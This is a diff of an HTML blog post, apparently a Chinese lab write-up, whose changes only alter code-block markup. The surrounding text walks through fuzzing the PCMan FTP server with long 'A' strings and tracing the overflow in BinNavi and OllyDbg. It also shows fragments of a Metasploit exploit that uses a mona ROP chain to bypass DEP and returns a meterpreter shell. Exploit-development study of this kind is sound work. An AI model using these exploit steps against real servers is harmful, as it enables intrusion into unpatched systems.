@@ -115,7 +115,7 @@
 
         <span itemprop="articleBody"><h3 id="0x01-install-binnavi">0x01 install binnavi</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/google/binnavi
+<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/google/binnavi
 https://www.freebuf.com/sectool/75529.html
 
 https://github.com/google/binnavi/releases
@@ -153,13 +153,14 @@ https://pan.baidu.com/s/1c2Jmtag
 4.安装idapro6.8,替换key文件,修改本机时间为几年前,将copy_to_ida_root_windows.zip里面的文件放入idapro根目录(重要,没有这步Edit|Plugin中看不到BinExport9),并将binexport的两个文件(zynamics_binexport_9.plw和zynamics_binexport_9.p64)放入idapro的plugin目录
 5.安装my_binnavi中的postgresql(x86),数据库用户名和密码设为postgres,将win2003中的c:\program files\postgresql目录设置为everyone有所有权限
 6.以管理员身份(否则在binnavi运行后无法import idb文件)运行binnavi-all.jar(win2003下右键以不受限方式打开cmd.exe,然后运行binnavi-all.jar)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x02-fuzz-target-app">0x02 fuzz target app</h3>
 
 <h4 id="about">about</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>target link:
+<div class="highlighter-rouge"><pre class="highlight"><code>target link:
     https://www.exploit-db.com/exploits/39662/
 target ftp app(pcmanftp):
     https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
@@ -168,21 +169,23 @@ ftp fuzz tool:
 
 challenge:
     尝试找到pcmanftp除了exploit-db中介绍的已经存在的漏洞以外其他的漏洞
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="fuzz">fuzz</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt;安装ftpfuzz(实验中安装到192.168.3.77中)
+<div class="highlighter-rouge"><pre class="highlight"><code>1&gt;安装ftpfuzz(实验中安装到192.168.3.77中)
 2&gt;设置user为annoymous,pass为test
 3&gt;只取list命令作为fuzz的对象
 4&gt;只选择A作为fuzz的数据
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/fuzzftp.png" /></p>
 
 <h3 id="0x03-binnavi使用方法">0x03 binnavi使用方法</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0&gt;binnavi安装在win2003上,ip:192.168.3.176
+<div class="highlighter-rouge"><pre class="highlight"><code>0&gt;binnavi安装在win2003上,ip:192.168.3.176
 1&gt;新建一个project
 2&gt;导入一个模块(ida生成的idb文件)
     出现错误及安装binnavi解决方法可参考https://github.com/google/binnavi/issues/94
@@ -224,7 +227,8 @@ challenge:
               192.168.3.177的win7上运行debugclient.exe pid时不用管理员身份运行虽然会报断点错误,但是好像实际实验
               中追踪效果更好,此点尚疑.一般情况下,每个应用都用管理员身份运行不易出错(debugclient.exe,pcmanftp,
               binnavi)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图1
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-1.png" /></p>
@@ -266,16 +270,17 @@ challenge:
 
 <p>追踪192.168.3.177中的pcmanftp进程的溢出指令</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.运行192.168.3.177上的pcmanftp后用管理员权限运行clientdebug.exe pid,然后单击192.168.3.176上的graph视图窗口下的debug perspective下的start debug,开始远程调试pcmanftp
+<div class="highlighter-rouge"><pre class="highlight"><code>1.运行192.168.3.177上的pcmanftp后用管理员权限运行clientdebug.exe pid,然后单击192.168.3.176上的graph视图窗口下的debug perspective下的start debug,开始远程调试pcmanftp
 2.单击start trace mode,binnavi下完断点后再单击start trace mode,此时binnavi中的trace列表如下图a,然后在192.168.3.77(另外一台win7,安装有ftpfuzz工具,用来fuzz目标192.168.3.177里的pcmanftp),事先设置fuzz数据为发送30,70...到9000个A,后来发现发送9000个A会使pcmanftp出错,于是最后设置fuzz数据为只发送9000个A,便于追踪出错的详细汇编语句,如下图b:
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图a
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/a.png" />
 图b
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/fuzz-2.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3.完成2中的设置后在192.168.3.77中单击上图中的start按钮,用ftpfuzz发送9000个A,只选择LIST命令进行fuzz,fuzz结束后binnavi中对应trace列表如下图trace1,说明ftpfuzz与binnavi的数据交互中共产生了72个event,也即从发送anonymous登录到发送完LIST 9000xA命令后的event,但是这样不能精确追踪到关键溢出(发送9000个A)时的代码,不会将登录ftp的过程记录到event中,使得event有72个,较大,为了精确追踪到pcmanftp对9000个A的数据处理过程,需要过滤掉fuzzftp登录pcmanftp的过程,于是进行如下操作:
+<div class="highlighter-rouge"><pre class="highlight"><code>3.完成2中的设置后在192.168.3.77中单击上图中的start按钮,用ftpfuzz发送9000个A,只选择LIST命令进行fuzz,fuzz结束后binnavi中对应trace列表如下图trace1,说明ftpfuzz与binnavi的数据交互中共产生了72个event,也即从发送anonymous登录到发送完LIST 9000xA命令后的event,但是这样不能精确追踪到关键溢出(发送9000个A)时的代码,不会将登录ftp的过程记录到event中,使得event有72个,较大,为了精确追踪到pcmanftp对9000个A的数据处理过程,需要过滤掉fuzzftp登录pcmanftp的过程,于是进行如下操作:
     on 192.168.3.177:
         关闭pcmanftp
         打开pcmanftp    #如果不重新打开pcmanftp,客户端用anonymous登录时会报"too many users"错误
@@ -317,7 +322,8 @@ challenge:
             _atoi
             sub_405410
             sub_427350
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图trace1
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/trace1.png" /></p>
@@ -328,7 +334,7 @@ challenge:
 <p>图trace3
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/trace3.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    追踪到相关指令后此时binavi暂时退出,用od调试pcmanftp
+<div class="highlighter-rouge"><pre class="highlight"><code>    追踪到相关指令后此时binavi暂时退出,用od调试pcmanftp
 
     on 192.168.3.177:
         重新打开pcmanftp,od附加
@@ -359,12 +365,13 @@ challenge:
         右键resume all threads  
             #此时可以单击状态栏中的pcmanftp可以显示pcmanftp主界面,且kali中也可以显示ftp会话信息,关于"卡住"以后为什么可以通过resume all threads来调试而"不影响"调试目的有以下猜想:
             windows程序有消息响应机制,windows程序中的主线程一直在等待各个子线程的消息,如果某个子线程中断或者出故障了,可能会被主线程知道,然后主线程调用相应方法去处理这个出问题的子线程,这样就可以解释在下完402b60,405410,427350的断点后,发送ls Ax9000到pcmanftp,在od中一直按f9,却没有在某时刻可以看到eip=41414141,而最后由于的确存在某时刻eip=41414141,导致异常,最后弹出如下图error显示的错误对话框,对话框中显示出错原因为eip被41414141覆盖,这样大概是因为当eip在某时刻被41414141覆盖的时候,于是这个子线程出故障了,程序的主线程知道了这个消息,然后调用seh链中的异常处理程序,处理的结果就是弹出这样一个错误详细信息对话框
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图error
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/error.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>on kali:
+<div class="highlighter-rouge"><pre class="highlight"><code>on kali:
     user:anonymous
     pass:test
     ls AAA..A(9000个)
@@ -430,12 +437,13 @@ on 192.168.3.177's od:
     ...
     (alt+c后共输入123个f9)
     此时观察到堆栈区第一次出现大长串AAAAAAAAAA,断点处在416685,也即在416685处的模块间调用开始出现AAAAAAA,如下图od1
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图od1
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/od1.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>于是重新在405410,416685,427350处下断点,重点关注405410到416685后,在416685开始的指令流程,具体如下:
+<div class="highlighter-rouge"><pre class="highlight"><code>于是重新在405410,416685,427350处下断点,重点关注405410到416685后,在416685开始的指令流程,具体如下:
 
 on 192.168.3.177'od:
     ctrl+g:405410---&gt;f2
@@ -485,12 +493,13 @@ on 192.168.3.177's od:
     --------------end--------------
     
     此时对应的od中截图如下图od2:
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图od2
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/od2.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>esp下面的第一个返回到的地址为当前栈帧的返回地址,也即汇编窗口中004166e9处的retn要返回到的地址
+<div class="highlighter-rouge"><pre class="highlight"><code>esp下面的第一个返回到的地址为当前栈帧的返回地址,也即汇编窗口中004166e9处的retn要返回到的地址
 esp下面的第二个返回到的地址4029db为当前函数栈帧的上一函数栈帧中的retn要返回的地址
 esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函数的上一函数的栈帧中的retn要返回的地址
 
@@ -775,7 +784,8 @@ exploit情况说明:
             set lhost 192.168.3.106
             exploit
       成功溢出后返回meterpreter的shell如下图meterpreter1,其中打印出来的数据为代码中print_status(tmp)的结果,即payload的数据
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图meterpreter1
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/meterpreter1.png" /></p>
@@ -786,7 +796,7 @@ exploit情况说明:
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/dep_open_on_win7.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>参考
+<div class="highlighter-rouge"><pre class="highlight"><code>参考
 https://www.blogbus.com/riusksk-logs/80935313.html
 https://drops.wooyun.org/papers/3602
 
@@ -1223,12 +1233,13 @@ def create_rop_chain()
 有比较大的可能性是执行完上面的rop_gadgets中的地址对应的指令后没有实现payload在栈中可执行,难道是不应该把mona生成的rop_gadges中的最后的pushad+retn对应的地址换成jmp esp的地址?
 
 再看看相关mona的资料,后面的pushad + retn应该是存在的,具体原因见下图virtualprotect_rop中所示
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>图virtualprotect_rop
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/virtualprotect_rop.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mona生成的rop_gadgets中的最后一句中的pushad+retn指令的地址是必须的,正是通过pushad+retn的执行才可以导致virtualprotect的执行,实现的原理是在pushad之前将pushad的各个寄存器按照对应的顺序设置成刚好可以调用virtualprotect函数使后面的shellcode为可执行
+<div class="highlighter-rouge"><pre class="highlight"><code>mona生成的rop_gadgets中的最后一句中的pushad+retn指令的地址是必须的,正是通过pushad+retn的执行才可以导致virtualprotect的执行,实现的原理是在pushad之前将pushad的各个寄存器按照对应的顺序设置成刚好可以调用virtualprotect函数使后面的shellcode为可执行
 后来调试在进入virtualprotect_rop前最后一个函数00403e60的返回语句是retn 4而不是retn,所以rop_gadgets中的第一个地址后要加一个过渡的值,这里取为0x41414141
 
 ----------------------------00403e60--------------------------------
@@ -1286,11 +1297,12 @@ def create_rop_chain()
     ].flatten.pack("V*")
 ------------------------end----------------------------
 再次开msf发payload,od附加,调试时发现如下图ebx_error错误
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>图ebx_error
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/ebx_error.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>后来发现原来的mona中的virtualprotect是获得0x201(对应上面的0xffffddff,neg取反后为0x201)个可执行栈空间,以为是msf中的payload比这个长导致shellcode执行出错,后来将这个值设置为0xffffddff后没能关掉dep,应该是由于长度太大或许超过了栈空间的大小而导致virtualprotect函数的失败,于是没能成功关掉dep
+<div class="highlighter-rouge"><pre class="highlight"><code>后来发现原来的mona中的virtualprotect是获得0x201(对应上面的0xffffddff,neg取反后为0x201)个可执行栈空间,以为是msf中的payload比这个长导致shellcode执行出错,后来将这个值设置为0xffffddff后没能关掉dep,应该是由于长度太大或许超过了栈空间的大小而导致virtualprotect函数的失败,于是没能成功关掉dep
 
 后来将这个值设置成0xfffffaff(neg取反后的结果比0x201大),又可以关掉dep了,只是后面的shellcode执行还是不成功
 
@@ -1430,7 +1442,8 @@ exploit
     end
 
 -------------------------------end-----------------------------------
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/succeed.png" /></p>
 </span>
